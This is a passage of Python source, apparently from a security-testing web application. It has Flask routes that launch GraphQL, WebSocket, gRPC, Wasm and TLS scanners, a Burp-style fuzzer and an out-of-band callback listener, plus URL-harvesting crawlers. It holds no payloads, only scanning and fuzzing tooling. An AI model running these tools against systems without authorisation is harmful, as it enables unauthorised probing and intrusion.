    if not _ENGINE_AVAILABLE:
        return jsonify({"error": "Engine not available"}), 503
    avail = available_wordlists()
    cats = []
    for name, filename in sorted(WORDLIST_CATEGORIES.items()):
        count = avail.get(name, 0)
        cats.append({"name": name, "filename": filename, "count": count, "available": count > 0})
    return jsonify({"wordlists": cats, "total_categories": len(cats)})


# ═══════════════════════════════════════════════════════════════════════════════
# ██  GRAPHQL SECURITY SCANNER (standalone)
# ═══════════════════════════════════════════════════════════════════════════════

_graphql_scan_running  = False
_graphql_scan_findings: list = []
_graphql_scan_status   = "idle"
_graphql_scan_stop     = threading.Event()

@app.route("/api/engine/graphql/scan", methods=["POST"])
@_login_required
def graphql_scan_start():
    """Launch a standalone GraphQL security scan against the configured target."""
    global _graphql_scan_running, _graphql_scan_findings, _graphql_scan_status, _graphql_scan_stop
    if not _ENGINE_AVAILABLE:
        return jsonify({"error": "Engine not available"}), 503
    if _graphql_scan_running:
        return jsonify({"error": "GraphQL scan already running"}), 409

    data = req.get_json(silent=True) or {}
    target = (data.get("target") or _scan_target or "").strip()
    if not target:
        return jsonify({"error": "No target configured — set target in Engine tab first"}), 400

    _graphql_scan_running  = True
    _graphql_scan_findings = []
    _graphql_scan_status   = "starting"
    _graphql_scan_stop     = threading.Event()

    def _gql_worker(t):
        global _graphql_scan_running, _graphql_scan_status
        try:
            from modules.graphql import GraphQLScanner

            _graphql_scan_status = "discovering endpoints"
            scanner = GraphQLScanner(
                target=t,
                stop_event=_graphql_scan_stop,
                timeout=10,
            )
            # Collect known GraphQL pages from sitemap if available
            extra = [url for url in _all_pages if
                     any(kw in (url if isinstance(url, str) else url.get("url", "")).lower()
                         for kw in ("graphql", "gql", "/query", "graphiql"))]
            extra_urls = [u if isinstance(u, str) else u.get("url", "") for u in extra]

            _graphql_scan_status = "running 12 security tests"
            results = scanner.scan(extra_urls=extra_urls)
            with _engine_lock:
                _graphql_scan_findings.extend(results)
            for gf in results:
                _record_finding(
                    agent="GraphQL Scanner", finding_text=gf.get("finding", ""),
                    severity=gf.get("severity", "medium"), target=gf.get("url", target),
                    agent_id="graphql", icon="🔮", phase="graphql_scan",
                    extra={
                        "type":        gf.get("vuln_type", "graphql"),
                        "proof":       gf.get("proof", ""),
                        "payload":     gf.get("payload", ""),
                        "url":         gf.get("url", target),
                        "param":       gf.get("param", "query"),
                        "status_code": gf.get("status_code", 0),
                    },
                )
            _graphql_scan_status = f"complete — {len(results)} findings"
        except Exception as e:
            log.error("[GQL] worker exception: %s", e)
            _graphql_scan_status = f"error: {e}"
        finally:
            _graphql_scan_running = False

    threading.Thread(target=_gql_worker, args=(target,), daemon=True).start()
    return jsonify({"success": True, "target": target})


@app.route("/api/engine/graphql/stop", methods=["POST"])
@_login_required
def graphql_scan_stop():
    _graphql_scan_stop.set()
    return jsonify({"success": True})


@app.route("/api/engine/graphql/status")
@_login_required
def graphql_scan_status():
    return jsonify({
        "running":  _graphql_scan_running,
        "status":   _graphql_scan_status,
        "findings": len(_graphql_scan_findings),
    })


@app.route("/api/engine/graphql/results")
@_login_required
def graphql_scan_results():
    with _engine_lock:
        results = list(_graphql_scan_findings)
    return jsonify({"results": results, "count": len(results), "running": _graphql_scan_running})


# ═══════════════════════════════════════════════════════════════════════════════
# ██  WEBSOCKET SECURITY SCANNER (standalone)
# ═══════════════════════════════════════════════════════════════════════════════

_ws_scan_running  = False
_ws_scan_findings: list = []
_ws_scan_status   = "idle"
_ws_scan_stop     = threading.Event()

@app.route("/api/engine/websocket/scan", methods=["POST"])
@_login_required
def ws_scan_start():
    """Launch a standalone WebSocket security scan against the configured target."""
    global _ws_scan_running, _ws_scan_findings, _ws_scan_status, _ws_scan_stop
    if not _ENGINE_AVAILABLE:
        return jsonify({"error": "Engine not available"}), 503
    if _ws_scan_running:
        return jsonify({"error": "WebSocket scan already running"}), 409

    data = req.get_json(silent=True) or {}
    target = (data.get("target") or _scan_target or "").strip()
    if not target:
        return jsonify({"error": "No target configured — set target in Engine tab first"}), 400

    _ws_scan_running  = True
    _ws_scan_findings = []
    _ws_scan_status   = "starting"
    _ws_scan_stop     = threading.Event()

    def _ws_worker(t):
        global _ws_scan_running, _ws_scan_status
        try:
            from modules.websocket import WebSocketScanner

            _ws_scan_status = "discovering WebSocket endpoints"
            # Pass auth headers so authenticated WS endpoints are reachable.
            _ws_auth_hdr: dict = {}
            if _engine_auth_handler:
                _ah = _engine_auth_handler.session
                _av = _ah.headers.get("Authorization", "")
                if _av:
                    _ws_auth_hdr["Authorization"] = _av
                _ck = "; ".join(f"{c.name}={c.value}" for c in _ah.cookies)
                if _ck:
                    _ws_auth_hdr["Cookie"] = _ck
            scanner = WebSocketScanner(
                target=t,
                stop_event=_ws_scan_stop,
                timeout=5,
                auth_headers=_ws_auth_hdr or None,
            )
            # Collect known WS pages from sitemap if available
            extra = [u if isinstance(u, str) else u.get("url", "") for u in _all_pages
                     if any(kw in (u if isinstance(u, str) else u.get("url", "")).lower()
                            for kw in ("websocket", "/ws", "socket", "cable", "signalr"))]

            _ws_scan_status = "running 13 security tests"
            results = scanner.scan(extra_urls=extra)
            with _engine_lock:
                _ws_scan_findings.extend(results)
            for wf in results:
                _record_finding(
                    agent="WebSocket Scanner", finding_text=wf.get("finding", ""),
                    severity=wf.get("severity", "medium"), target=wf.get("url", target),
                    agent_id="websocket", icon="🔌", phase="websocket_scan",
                    extra={
                        "type":        wf.get("vuln_type", "websocket"),
                        "proof":       wf.get("proof", ""),
                        "payload":     wf.get("payload", ""),
                        "url":         wf.get("url", target),
                        "param":       wf.get("param", "frame"),
                        "status_code": wf.get("status_code", 0),
                    },
                )
            _ws_scan_status = f"complete — {len(results)} findings"
        except Exception as e:
            log.error("[WS] worker exception: %s", e)
            _ws_scan_status = f"error: {e}"
        finally:
            _ws_scan_running = False

    threading.Thread(target=_ws_worker, args=(target,), daemon=True).start()
    return jsonify({"success": True, "target": target})


@app.route("/api/engine/websocket/stop", methods=["POST"])
@_login_required
def ws_scan_stop():
    _ws_scan_stop.set()
    return jsonify({"success": True})


@app.route("/api/engine/websocket/status")
@_login_required
def ws_scan_status():
    return jsonify({
        "running":  _ws_scan_running,
        "status":   _ws_scan_status,
        "findings": len(_ws_scan_findings),
    })


@app.route("/api/engine/websocket/results")
@_login_required
def ws_scan_results():
    with _engine_lock:
        results = list(_ws_scan_findings)
    return jsonify({"results": results, "count": len(results), "running": _ws_scan_running})


# ═══════════════════════════════════════════════════════════════════════════════
# ██  gRPC SECURITY SCANNER (standalone)
# ═══════════════════════════════════════════════════════════════════════════════

_grpc_scan_running  = False
_grpc_scan_findings: list = []
_grpc_scan_status   = "idle"
_grpc_scan_stop     = threading.Event()
_grpc_scan_methods: list = []   # discovered GrpcMethod objects serialized


@app.route("/api/engine/grpc/scan", methods=["POST"])
@_login_required
def grpc_scan_start():
    """Launch a gRPC security scan. Body: {host, port, use_tls, proto_file}"""
    global _grpc_scan_running, _grpc_scan_findings, _grpc_scan_status, _grpc_scan_stop, _grpc_scan_methods
    if _grpc_scan_running:
        return jsonify({"error": "gRPC scan already running"}), 409

    data    = req.get_json(silent=True) or {}
    target  = (data.get("host") or data.get("target") or _scan_target or "").strip()
    if not target:
        return jsonify({"error": "No host configured — provide host in request body"}), 400

    # Strip scheme/path if user passed a full URL
    from urllib.parse import urlparse as _up
    parsed  = _up(target if "://" in target else "grpc://" + target)
    host    = parsed.hostname or target
    port    = int(data.get("port") or parsed.port or 50051)
    use_tls = bool(data.get("use_tls", False))

    _grpc_scan_running  = True
    _grpc_scan_findings = []
    _grpc_scan_methods  = []
    _grpc_scan_status   = "starting"
    _grpc_scan_stop     = threading.Event()

    def _grpc_worker():
        global _grpc_scan_running, _grpc_scan_status, _grpc_scan_methods

        def _on_progress(step: str, detail: str) -> None:
            global _grpc_scan_status
            _grpc_scan_status = f"{step}: {detail}" if detail else step

        def _on_finding(f) -> None:
            fd = f.to_dict()
            with _engine_lock:
                _grpc_scan_findings.append(fd)
            _record_finding(
                agent="gRPC Scanner", finding_text=f.finding, severity=f.severity,
                target=f"{f.host}:{f.port}", agent_id="grpc", icon="⚡", phase="grpc_scan",
                extra={"grpc_meta": {
                    "service": f.service, "method": f.method, "test": f.test,
                    "vuln_type": f.vuln_type, "proof": f.proof,
                    "grpc_status": f.grpc_status, "stream_type": f.stream_type,
                }},
            )

        try:
            # Forward application-level Bearer token as gRPC metadata so that
            # auth-gated services are reachable during all scan phases.
            _grpc_auth_meta: List[Tuple[str, str]] = []
            if _engine_auth_handler:
                _bearer = _engine_auth_handler.session.headers.get("Authorization", "")
                if _bearer:
                    _grpc_auth_meta.append(("authorization", _bearer))

            scanner = GrpcScanner(
                host          = host,
                port          = port,
                stop_event    = _grpc_scan_stop,
                use_tls       = use_tls,
                on_finding    = _on_finding,
                on_progress   = _on_progress,
                auth_metadata = _grpc_auth_meta or None,
            )
            findings = scanner.scan()
            with _engine_lock:
                _grpc_scan_methods = [
                    {"service": m.service, "method": m.method,
                     "stream_type": m.stream_type,
                     "request_type": m.request_type,
                     "response_type": m.response_type}
                    for m in scanner.discovered_methods
                ]
            _grpc_scan_status = (
                f"complete — {len(findings)} finding(s) across "
                f"{len(_grpc_scan_methods)} method(s)"
            )
        except Exception as e:
            log.error("[gRPC] scan worker error: %s", e)
            _grpc_scan_status = f"error: {e}"
        finally:
            _grpc_scan_running = False

    threading.Thread(target=_grpc_worker, daemon=True, name="dast-grpc-scan").start()
    return jsonify({"success": True, "host": host, "port": port, "use_tls": use_tls})


@app.route("/api/engine/grpc/stop", methods=["POST"])
@_login_required
def grpc_scan_stop():
    _grpc_scan_stop.set()
    return jsonify({"success": True})


@app.route("/api/engine/grpc/status")
@_login_required
def grpc_scan_status_route():
    return jsonify({
        "running":  _grpc_scan_running,
        "status":   _grpc_scan_status,
        "findings": len(_grpc_scan_findings),
        "methods":  len(_grpc_scan_methods),
    })


@app.route("/api/engine/grpc/results")
@_login_required
def grpc_scan_results():
    return jsonify({
        "findings": list(_grpc_scan_findings),
        "methods":  list(_grpc_scan_methods),
        "count":    len(_grpc_scan_findings),
        "running":  _grpc_scan_running,
        "status":   _grpc_scan_status,
    })


# ═══════════════════════════════════════════════════════════════════════════════
# ██  WASM SECURITY SCANNER (standalone)
# ═══════════════════════════════════════════════════════════════════════════════

_wasm_scan_running  = False
_wasm_scan_findings: list = []
_wasm_scan_status   = "idle"
_wasm_scan_stop     = threading.Event()


@app.route("/api/engine/wasm/scan", methods=["POST"])
@_login_required
def wasm_scan_start():
    """Launch a Wasm security scan. Body: {target} (defaults to current scan target)."""
    global _wasm_scan_running, _wasm_scan_findings, _wasm_scan_status, _wasm_scan_stop
    if _wasm_scan_running:
        return jsonify({"error": "Wasm scan already running"}), 409

    data   = req.get_json(silent=True) or {}
    target = (data.get("target") or _scan_target or "").strip()
    if not target:
        return jsonify({"error": "No target configured — provide target in request body or start main scan first"}), 400

    _wasm_scan_running  = True
    _wasm_scan_findings = []
    _wasm_scan_status   = "starting"
    _wasm_scan_stop     = threading.Event()

    def _wasm_worker():
        global _wasm_scan_running, _wasm_scan_status
        try:
            scanner = WasmScanner(target=target, stop_event=_wasm_scan_stop)
            scanner.scan()
            with _engine_lock:
                for wf in scanner.get_findings():
                    fd = wf.__dict__.copy()
                    _wasm_scan_findings.append(fd)
                    _record_finding(
                        agent="Wasm Scanner", finding_text=wf.finding,
                        severity=wf.severity, target=wf.url,
                        agent_id="wasm", icon="🔷", phase="wasm_scan",
                        extra={"vuln_type": wf.vuln_type, "cve": wf.cve, "evidence": wf.evidence},
                    )
            _wasm_scan_status = f"complete — {len(_wasm_scan_findings)} finding(s)"
        except Exception as e:
            log.error("[Wasm] scan worker error: %s", e)
            _wasm_scan_status = f"error: {e}"
        finally:
            _wasm_scan_running = False

    threading.Thread(target=_wasm_worker, daemon=True, name="dast-wasm-scan").start()
    return jsonify({"success": True, "target": target})


@app.route("/api/engine/wasm/stop", methods=["POST"])
@_login_required
def wasm_scan_stop():
    _wasm_scan_stop.set()
    return jsonify({"success": True})


@app.route("/api/engine/wasm/status")
@_login_required
def wasm_scan_status_route():
    return jsonify({
        "running":  _wasm_scan_running,
        "status":   _wasm_scan_status,
        "findings": len(_wasm_scan_findings),
    })


@app.route("/api/engine/wasm/results")
@_login_required
def wasm_scan_results():
    return jsonify({
        "findings": list(_wasm_scan_findings),
        "count":    len(_wasm_scan_findings),
        "running":  _wasm_scan_running,
        "status":   _wasm_scan_status,
    })


# ═══════════════════════════════════════════════════════════════════════════════
# ██  INTRUDER (Burp-style flexible fuzzer)
# ═══════════════════════════════════════════════════════════════════════════════

_intruder_running  = False
_intruder_results: list = []
_intruder_status   = "idle"
_intruder_stop     = threading.Event()


@app.route("/api/intruder/run", methods=["POST"])
@_login_required
def intruder_run():
    """Launch an Intruder attack. Body: {target, method, template, payloads, attack_mode, grep_match}."""
    global _intruder_running, _intruder_results, _intruder_status, _intruder_stop
    if _intruder_running:
        return jsonify({"error": "Intruder already running"}), 409

    data        = req.get_json(silent=True) or {}
    target      = (data.get("target") or _scan_target or "").strip()
    method      = (data.get("method") or "GET").upper()
    template    = data.get("template") or "\xa7FUZZ\xa7"
    payloads    = data.get("payloads") or {"FUZZ": ["test"]}
    attack_mode = (data.get("attack_mode") or "sniper").strip()
    grep_match  = data.get("grep_match") or []

    if not target:
        return jsonify({"error": "No target configured — provide target in request body or start main scan first"}), 400

    _intruder_running  = True
    _intruder_results  = []
    _intruder_status   = "starting"
    _intruder_stop     = threading.Event()

    def _intruder_worker():
        global _intruder_running, _intruder_status
        try:
            import requests as _req_intruder
            intruder = Intruder(
                attack_mode=AttackMode[attack_mode.upper()],
                stop_event=_intruder_stop,
            )
            intruder.set_template(template)
            for name, payload_list in payloads.items():
                intruder.add_payload_set(name, payload_list)
            if grep_match:
                intruder.set_grep_match(grep_match)
            _intruder_status = "running"
            results = intruder.run(
                base_url=target,
                method=method,
                session=_req_intruder.Session(),
            )
            result_dicts = [r.to_dict() for r in results]
            _intruder_results.extend(result_dicts)
            # ── Persist all Intruder results to raw_requests table ───────────
            try:
                raw_rows = []
                for r in result_dicts:
                    pv = r.get("payload_values") or {}
                    payload_str = ", ".join(f"{k}={v}" for k, v in pv.items()) if pv else ""
                    raw_rows.append({
                        "scan_id":       _active_scan_id or "",
                        "source":        "intruder",
                        "url":           r.get("request_url", target),
                        "method":        r.get("request_method", method),
                        "req_body":      r.get("request_body", ""),
                        "payload":       payload_str,
                        "status_code":   r.get("response_status", 0),
                        "resp_body":     (r.get("response_body") or "")[:8192],
                        "resp_time_ms":  r.get("latency_ms", 0),
                        "content_length": r.get("response_length", 0),
                        "grep_matches":  r.get("grep_matches", []),
                        "baseline_diff": r.get("baseline_length_diff", 0),
                        "is_finding":    bool(r.get("grep_matches")),
                    })
                _db.bulk_store_raw_requests(raw_rows)
            except Exception as _pe:
                log.debug("[Intruder] persist error: %s", _pe)
            _intruder_status = f"complete — {len(results)} result(s)"
        except Exception as e:
            log.error("[Intruder] worker error: %s", e)
            _intruder_status = f"error: {e}"
        finally:
            _intruder_running = False

    threading.Thread(target=_intruder_worker, daemon=True, name="dast-intruder").start()
    return jsonify({"success": True, "attack_mode": attack_mode, "target": target})


@app.route("/api/intruder/stop", methods=["POST"])
@_login_required
def intruder_stop():
    _intruder_stop.set()
    return jsonify({"success": True})


@app.route("/api/intruder/status")
@_login_required
def intruder_status_route():
    return jsonify({
        "running": _intruder_running,
        "status":  _intruder_status,
        "count":   len(_intruder_results),
    })


@app.route("/api/intruder/results")
@_login_required
def intruder_results_route():
    return jsonify({
        "results": list(_intruder_results),
        "count":   len(_intruder_results),
        "running": _intruder_running,
        "status":  _intruder_status,
    })


# ═══════════════════════════════════════════════════════════════════════════════
# ██  TLS ANALYZER (deep certificate and TLS analysis)
# ═══════════════════════════════════════════════════════════════════════════════

_tls_scan_running  = False
_tls_scan_findings: list = []
_tls_scan_status   = "idle"
_tls_scan_stop     = threading.Event()


@app.route("/api/engine/tls/scan", methods=["POST"])
@_login_required
def tls_scan_start():
    """Launch a TLS/certificate analysis. Body: {target} (defaults to current scan target)."""
    global _tls_scan_running, _tls_scan_findings, _tls_scan_status, _tls_scan_stop
    if _tls_scan_running:
        return jsonify({"error": "TLS scan already running"}), 409

    data   = req.get_json(silent=True) or {}
    target = (data.get("target") or _scan_target or "").strip()
    if not target:
        return jsonify({"error": "No target configured — provide target in request body or start main scan first"}), 400

    _tls_scan_running  = True
    _tls_scan_findings = []
    _tls_scan_status   = "starting"
    _tls_scan_stop     = threading.Event()

    def _tls_worker():
        global _tls_scan_running, _tls_scan_status
        try:
            analyzer = TLSAnalyzer(stop_event=_tls_scan_stop)
            tls_findings = analyzer.scan(target)
            _tls_scan_findings.extend([f.to_dict() for f in tls_findings])
            for tf in tls_findings:
                _record_finding(
                    agent="TLS Analyzer", finding_text=tf.finding,
                    severity=tf.severity, target=tf.url,
                    agent_id="tls", icon="\U0001f512", phase="tls_scan",
                    extra={"vuln_type": tf.vuln_type, "evidence": tf.evidence},
                )
            _tls_scan_status = f"complete — {len(tls_findings)} finding(s)"
        except Exception as e:
            log.error("[TLS] scan worker error: %s", e)
            _tls_scan_status = f"error: {e}"
        finally:
            _tls_scan_running = False

    threading.Thread(target=_tls_worker, daemon=True, name="dast-tls-scan").start()
    return jsonify({"success": True, "target": target})


@app.route("/api/engine/tls/stop", methods=["POST"])
@_login_required
def tls_scan_stop():
    _tls_scan_stop.set()
    return jsonify({"success": True})


@app.route("/api/engine/tls/status")
@_login_required
def tls_scan_status_route():
    return jsonify({
        "running":  _tls_scan_running,
        "status":   _tls_scan_status,
        "findings": len(_tls_scan_findings),
    })


@app.route("/api/engine/tls/results")
@_login_required
def tls_scan_results():
    return jsonify({
        "findings": list(_tls_scan_findings),
        "count":    len(_tls_scan_findings),
        "running":  _tls_scan_running,
    })


# ═══════════════════════════════════════════════════════════════════════════════
# ██  OAST SERVER ROUTES
# ═══════════════════════════════════════════════════════════════════════════════

@app.route("/api/oast/start", methods=["POST"])
@_login_required
def oast_start():
    """Start the OAST callback listener."""
    if not _ENGINE_AVAILABLE:
        return jsonify({"error": "Engine not available"}), 503
    data = req.get_json(silent=True) or {}
    host = data.get("host_override", "")
    try:
        srv  = get_or_start_oast(host_override=host)
        return jsonify({"success": True, "status": srv.status()})
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/api/oast/status")
@_login_required
def oast_status():
    """Get OAST server status."""
    if not _ENGINE_AVAILABLE:
        return jsonify({"available": False})
    try:
        srv = get_or_start_oast()
        return jsonify(srv.status())
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/api/oast/callbacks")
@_login_required
def oast_callbacks():
    """Return all OAST callbacks received."""
    if not _ENGINE_AVAILABLE:
        return jsonify({"callbacks": [], "count": 0})
    try:
        srv       = get_or_start_oast()
        callbacks = srv.all_callbacks()
        return jsonify({"callbacks": callbacks, "count": len(callbacks)})
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/api/oast/clear", methods=["POST"])
@_login_required
def oast_clear():
    """Clear all captured OAST callbacks."""
    if _ENGINE_AVAILABLE:
        try:
            get_or_start_oast().clear()
        except Exception:
            pass
    return jsonify({"success": True})


# ═══════════════════════════════════════════════════════════════════════════════
# ██  ADVANCED CRAWLER — Playwright AJAX + Katana + Wayback (unified, deduped)
# ═══════════════════════════════════════════════════════════════════════════════

def _fetch_seed_urls(target: str, stop_event: threading.Event) -> list:
    """Fetch robots.txt and sitemap.xml from target, return seed URL entries.

    Parses:
      - robots.txt  → Disallow/Allow paths (attack surface hints) + Sitemap: directives
      - sitemap.xml → all <loc> URLs (regular sitemap + sitemap index recursion)

    Returns list of {url, source='robots'|'sitemap', status=0, content_type='', title=''}
    """
    from urllib.parse import urljoin, urlparse as _up
    import urllib.request as _ur
    import re as _re

    parsed      = _up(target)
    base_origin = f"{parsed.scheme}://{parsed.netloc}"
    seed:  list = []
    seen_u: set = set()
    seen_sm: set = set()

    def _fetch(url: str, timeout: int = 6) -> str:
        try:
            req = _ur.Request(url, headers={"User-Agent": "DAST-SeedFetcher/1.0"})
            with _ur.urlopen(req, timeout=timeout) as resp:
                return resp.read().decode("utf-8", errors="replace")
        except Exception:
            return ""

    def _add(url: str, source: str):
        url = url.strip()
        if url and url not in seen_u:
            seen_u.add(url)
            seed.append({"url": url, "source": source, "status": 0,
                         "content_type": "", "title": ""})

    def _parse_sitemap(url: str, depth: int = 0):
        if depth > 4 or url in seen_sm or stop_event.is_set():
            return
        seen_sm.add(url)
        content = _fetch(url)
        if not content:
            return
        # Sitemap index: recurse into child sitemaps
        for loc in _re.findall(r"<sitemap>.*?<loc>(.*?)</loc>.*?</sitemap>",
                                content, _re.DOTALL):
            if not stop_event.is_set():
                _parse_sitemap(loc.strip(), depth + 1)
        # Regular sitemap: <url><loc>...</loc></url>
        for loc in _re.findall(r"<url>.*?<loc>(.*?)</loc>.*?</url>",
                                content, _re.DOTALL):
            if stop_event.is_set():
                break
            _add(loc.strip(), "sitemap")

    # ── robots.txt ────────────────────────────────────────────────────────────
    robots_content = _fetch(f"{base_origin}/robots.txt")
    if robots_content and not stop_event.is_set():
        for line in robots_content.splitlines():
            line = line.strip()
            if stop_event.is_set():
                break
            if line.lower().startswith("sitemap:"):
                sitemap_url = line.split(":", 1)[1].strip()
                if sitemap_url:
                    _parse_sitemap(sitemap_url)
            elif line.lower().startswith(("disallow:", "allow:")):
                path = line.split(":", 1)[1].strip()
                # Skip wildcards and trivial entries
                if path and path not in ("/", "") and "*" not in path:
                    full_url = urljoin(base_origin + "/", path.lstrip("/"))
                    _add(full_url, "robots")

    # ── sitemap.xml (if no Sitemap: directive was found in robots.txt) ────────
    if not seen_sm and not stop_event.is_set():
        _parse_sitemap(f"{base_origin}/sitemap.xml")

    return seed


def _run_graphql_introspection(target: str, stop_event: threading.Event,
                                discovered_urls: list) -> list:
    """Try GraphQL introspection on known + common GraphQL endpoints.

    `discovered_urls` — list of URL strings already found by other crawlers,
    used to detect /graphql paths that are definitely alive.

    Returns list of {url, source='graphql', status, content_type, title}
    """
    import requests as _r
    import urllib3 as _u3
    _u3.disable_warnings(_u3.exceptions.InsecureRequestWarning)
    from urllib.parse import urlparse as _up

    parsed      = _up(target)
    base_origin = f"{parsed.scheme}://{parsed.netloc}"

    # Well-known GraphQL paths + anything already discovered that looks like GraphQL
    gql_paths = {"/graphql", "/api/graphql", "/query", "/gql",
                 "/graphiql", "/v1/graphql", "/v2/graphql", "/api/query"}
    for u in discovered_urls:
        p = _up(u).path.lower()
        if "graphql" in p or "/gql" in p or "/query" in p:
            gql_paths.add(_up(u).path)

    introspection_q = {"query": "{ __schema { queryType { name } types { name kind fields { name } } } }"}
    results = []

    for path in gql_paths:
        if stop_event.is_set():
            break
        url = base_origin + path
        try:
            resp = _r.post(
                url,
                json    = introspection_q,
                timeout = 5,
                verify  = False,
                headers = {"Content-Type": "application/json",
                           "User-Agent": "DAST-GraphQL/1.0"},
            )
            if resp.status_code == 200:
                try:
                    data   = resp.json()
                    schema = (data.get("data") or {}).get("__schema")
                    if schema:
                        types = [t["name"] for t in (schema.get("types") or [])
                                 if t.get("name") and not t["name"].startswith("__")]
                        results.append({
                            "url":          url,
                            "source":       "graphql",
                            "status":       200,
                            "content_type": "application/json",
                            "title":        f"[GraphQL] {len(types)} types",
                        })
                except Exception:
                    pass
        except Exception:
            pass

    return results


def _run_wayback(target: str, stop_event: threading.Event, limit: int = 5000):
    """Fetch all historical URLs for target from Wayback Machine CDX API.

    Returns list of raw URL strings (unprobed — call _probe_liveness next).
    """
    from urllib.parse import urlparse as _up
    import urllib.request as _ur
    import urllib.parse as _uparse

    parsed   = _up(target)
    domain   = parsed.netloc or parsed.path   # handle bare domain input
    # Strip port for CDX query (archive.org indexes by hostname only)
    host     = domain.split(":")[0]

    cdx_url  = (
        "https://web.archive.org/cdx/search/cdx"
        f"?url={_uparse.quote(host)}/*"
        "&output=json"
        "&fl=original"
        "&collapse=urlkey"
        f"&limit={limit}"
    )

    raw_urls: list = []
    try:
        req  = _ur.Request(cdx_url, headers={"User-Agent": "DAST-WaybackHarvester/1.0"})
        with _ur.urlopen(req, timeout=20) as resp:
            if stop_event.is_set():
                return []
            data = json.loads(resp.read().decode("utf-8", errors="replace"))
            # First row is the header ["original"], skip it
            for row in data[1:]:
                if stop_event.is_set():
                    break
                if row and row[0]:
                    url = row[0].strip()
                    # Keep only same-host HTTP/HTTPS URLs
                    try:
                        p = _up(url)
                        if p.scheme in ("http", "https") and host in p.netloc:
                            raw_urls.append(url)
                    except Exception:
                        pass
    except Exception:
        pass

    return raw_urls


def _probe_liveness(urls, stop_event, timeout: int = 5):
    """Probe a list of URLs for liveness using httpx binary or requests fallback.

    Returns list of {url, status, content_type, source='wayback'} for live URLs (2xx/3xx).
    Dead URLs (404, 5xx, timeout) are silently dropped.
    """
    if not urls:
        return []

    live: list = []

    # ── Path 1: httpx binary (fastest — concurrent Go HTTP client) ────────────
    if _HTTPX_AVAILABLE and not stop_event.is_set():
        import tempfile, os
        with tempfile.NamedTemporaryFile(mode="w", suffix=".txt", delete=False) as tf:
            tf.write("\n".join(urls))
            tf_path = tf.name
        try:
            cmd = [
                "httpx",
                "-l", tf_path,
                "-silent",
                "-sc",           # status code
                "-ct",           # content-type
                "-timeout", str(timeout),
                "-threads", "25",
                "-json",
                "-no-color",
            ]
            proc = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.DEVNULL,
                text=True,
            )
            for line in proc.stdout:  # type: ignore[union-attr]
                if stop_event.is_set():
                    proc.terminate()
                    break
                line = line.strip()
                if not line:
                    continue
                try:
                    obj    = json.loads(line)
                    status = obj.get("status-code", 0) or obj.get("status_code", 0)
                    if 200 <= status < 400:
                        live.append({
                            "url":          obj.get("url", ""),
                            "status":       status,
                            "content_type": obj.get("content-type", ""),
                            "source":       "wayback",
                            "title":        obj.get("title", ""),
                        })
                except (json.JSONDecodeError, KeyError):
                    pass
            proc.wait(timeout=5)
        except Exception:
            pass
        finally:
            try:
                os.unlink(tf_path)
            except Exception:
                pass
        return live

    # ── Path 2: requests fallback (no httpx binary) ───────────────────────────
    import concurrent.futures
    import requests as _r
    import urllib3 as _u3
    _u3.disable_warnings(_u3.exceptions.InsecureRequestWarning)

    def _check(url):
        if stop_event.is_set():
            return None
        try:
            resp = _r.head(
                url,
                timeout    = timeout,
                verify     = False,
                allow_redirects = True,
                headers    = {"User-Agent": "DAST-WaybackProbe/1.0"},
            )
            if 200 <= resp.status_code < 400:
                return {
                    "url":          resp.url,
                    "status":       resp.status_code,
                    "content_type": resp.headers.get("content-type", ""),
                    "source":       "wayback",
                    "title":        "",
                }
        except Exception:
            pass
        return None

    with concurrent.futures.ThreadPoolExecutor(max_workers=20) as ex:
        futures = {ex.submit(_check, u): u for u in urls}
        for fut in concurrent.futures.as_completed(futures):
            if stop_event.is_set():
                break
            result = fut.result()
            if result:
                live.append(result)

    return live


def _run_katana(target: str, stop_event: threading.Event,
                depth: int = 3, rate_limit: int = 10,
                extra_headers=None,    # Optional[list[str]]
                form_fill: bool = True,
                concurrency: int = 10,
                max_time: int = 180):  # hard 3-minute wall-clock limit
    """Run katana binary as subprocess, parse JSONL output.

    Full JS coverage mode:
      -jc           JS file crawling (parse .js files for endpoints)
      -jsl          JSLuice — advanced bundled-JS endpoint extraction
      -aff          Automatic Form Fill — submits forms to discover POST endpoints
      -c 10         10 parallel crawlers (vs default 1)
      -strategy bfs Breadth-first so shallow endpoints aren't missed
      -kf all       Capture forms, links, scripts

    Returns:
      results  — list of {url, method, source='katana', status, content_type, title}
      surfaces — list of (endpoint, method, body, content_type) for POST InputSurface creation
    """
    import shutil as _sh
    katana_bin = _sh.which("katana")
    if not katana_bin:
        return [], []

    cmd = [
        katana_bin,
        "-u", target,
        "-d", str(depth),
        "-jc",                         # JS crawling
        "-jsl",                        # JSLuice endpoint extraction
        "-rl", str(rate_limit),
        "-c", str(concurrency),        # parallel crawlers
        "-strategy", "breadth-first",  # breadth-first → broader coverage first
        "-timeout", "10",
        "-silent",
        "-jsonl",
        "-kf", "all",                  # forms, links, scripts
        "-no-color",
    ]
    if form_fill:
        cmd.append("-aff")   # Automatic Form Fill → discovers POST endpoints
    if extra_headers:
        for h in extra_headers:
            cmd += ["-H", h]

    results:  list = []
    surfaces: list = []   # (endpoint, method, body, content_type) tuples

    try:
        proc = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.DEVNULL,
            text=True,
        )
        # Hard wall-clock limit — terminates Katana if it runs too long
        _kill_timer = threading.Timer(max_time, proc.terminate)
        _kill_timer.start()
        try:
            for line in proc.stdout:  # type: ignore[union-attr]
                if stop_event.is_set():
                    proc.terminate()
                    break
                line = line.strip()
                if not line:
                    continue
                try:
                    obj      = json.loads(line)
                    req      = obj.get("request", {})
                    resp     = obj.get("response", {})
                    endpoint = req.get("endpoint") or obj.get("endpoint", "")
                    method   = req.get("method", "GET")
                    body     = req.get("body", "") or ""
                    status   = resp.get("status_code", 0)
                    ct_resp  = resp.get("content_type", "")
                    ct_req   = req.get("headers", {}).get("content-type", "")

                    if endpoint:
                        results.append({
                            "url":          endpoint,
                            "method":       method,
                            "source":       "katana",
                            "status":       status,
                            "content_type": ct_resp,
                            "title":        "",
                        })
                        if method in ("POST", "PUT", "PATCH") and body:
                            surfaces.append((endpoint, method, body, ct_req or "application/x-www-form-urlencoded"))
                except (json.JSONDecodeError, KeyError):
                    pass
        finally:
            _kill_timer.cancel()
        proc.wait(timeout=5)
    except Exception:
        pass
    return results, surfaces


def _run_katana_js_static(js_urls: list, stop_event: threading.Event) -> list:
